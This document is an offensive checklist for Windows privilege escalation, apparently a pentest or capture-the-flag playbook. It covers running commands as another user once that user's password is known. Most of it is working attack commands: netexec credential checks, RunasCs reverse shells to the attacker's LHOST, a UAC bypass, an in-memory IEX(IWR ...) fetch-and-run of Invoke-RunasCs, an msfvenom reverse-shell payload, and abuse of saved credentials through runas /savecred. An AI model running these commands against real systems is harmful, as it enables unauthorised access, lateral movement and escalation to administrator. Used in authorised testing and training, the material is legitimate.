# Windows privesc: running as another user

## What I hold
- [ ] A password for <Username>, from :Pb windows-creds, while my shell runs as someone else
At the pwn-broker prompt: tool install netexec.
Whether a remote login works first, from Kali:
nxc winrm <TargetIP> -u '<Username>' -p '<Password>' --local-auth
nxc winrm <TargetIP> -d <Domain> -u '<Username>' -p '<Password>'
nxc rdp <TargetIP> -d <Domain> -u '<Username>' -p '<Password>'
- [ ] (Pwn3d!) on winrm: evil-winrm -i <TargetIP> -u '<Username>' -p '<Password>', and this playbook is not needed

## RunasCs
At the pwn-broker prompt:
tool install runascs
serve
serve files runascs
On the target:
cd C:\Users\Public
- [ ] RunasCs.exe fetched here with the line serve files gives
.\RunasCs.exe "<Username>" "<Password>" "cmd /c whoami /all"
A domain account:
.\RunasCs.exe "<Username>" "<Password>" "cmd /c whoami /all" -d <Domain>
- [ ] A password with $ or a backtick in it, from PowerShell: single quotes instead
- [ ] The user has not been granted the requested logon type: -l 8, a network logon with the password, then -l 9 below

## A shell as that user
rlwrap nc -lvnp <LPORT>
.\RunasCs.exe "<Username>" "<Password>" cmd.exe -r <LHOST>:<LPORT>
.\RunasCs.exe "<Username>" "<Password>" powershell.exe -r <LHOST>:<LPORT> -d <Domain> -l 8
- [ ] RunasCs waits for the program: -t 0 starts it in the background and returns at once

## An administrator, past UAC
.\RunasCs.exe "<Username>" "<Password>" cmd.exe -r <LHOST>:<LPORT> --bypass-uac
whoami /groups | findstr /i "Label"
- [ ] High Mandatory Level: elevated, so on to :Pb windows-creds for the hashes

## Only on the network, as runas /netonly does
Logon type 9 keeps me locally and uses the account over the network, for shares and LDAP:
.\RunasCs.exe "<Username>" "<Password>" cmd.exe -r <LHOST>:<LPORT> -d <Domain> -l 9

## Invoke-RunasCs, in memory
Invoke-RunasCs.ps1 goes in the target's upload/ folder; THE-SERVE-URL is the address serve files prints for it.
IEX(IWR -UseBasicParsing THE-SERVE-URL); Invoke-RunasCs -Username "<Username>" -Password "<Password>" -Command "cmd.exe" -Remote <LHOST>:<LPORT>

## From PowerShell, with no tool
$cred = New-Object System.Management.Automation.PSCredential('<Username>', (ConvertTo-SecureString '<Password>' -AsPlainText -Force))
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
- [ ] Needs WinRM on the box and the user in Remote Management Users or Administrators

## Saved credentials: runas /savecred
cmdkey /list
- [ ] An entry whose User is <TargetUser>, written with its host or domain in front as cmdkey shows it
A payload on Kali, then into the target's upload/ folder:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o rev.exe
- [ ] Fetched to C:\Users\Public\rev.exe
runas /savecred /user:<TargetUser> "C:\Users\Public\rev.exe"
- [ ] No prompt, and the shell comes back as <TargetUser>

## With a desktop
runas /user:<Username> cmd.exe
runas /netonly /user:<Domain>\<Username> cmd.exe
- [ ] Both ask for the password, so they only work at a real console or over RDP
